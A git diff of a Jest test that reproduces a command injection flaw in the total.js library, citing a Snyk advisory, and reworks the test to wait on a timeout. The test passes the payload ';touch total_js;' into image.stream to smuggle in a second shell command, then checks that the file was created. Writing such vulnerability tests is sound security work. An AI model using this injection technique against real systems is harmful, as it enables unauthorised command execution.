@@ -1,5 +1,5 @@
 //https://snyk.io/vuln/SNYK-JS-TOTALJS-1046672
-test("Command Injection in total.js", async () => {
+test("Command Injection in total.js", (done) => {
   expect.assertions(2);
   const total = require("total.js");
   const fs = require("fs");
@@ -19,9 +19,17 @@ test("Command Injection in total.js", async () => {
   let payload = ";touch total_js;";
   var timetaken = "Time taken by addCount function";
   console.time(timetaken);
-  await image.stream(payload);
+  image.stream(payload);
   console.timeEnd(timetaken);
-  file_exist = fs.existsSync(path);
-  expect(file_exist).toBe(true);
-  await fs.unlink(path, function (err) {});
+  // file_exist = fs.existsSync(path);
+  // expect(file_exist).toBe(true);
+  // fs.unlinkSync(path);
+
+  setTimeout(() => {
+    file_exist = fs.existsSync(path);
+    expect(file_exist).toBe(true);
+    fs.unlink(path, () => {
+      done();
+    });
+  }, 1000);
 });
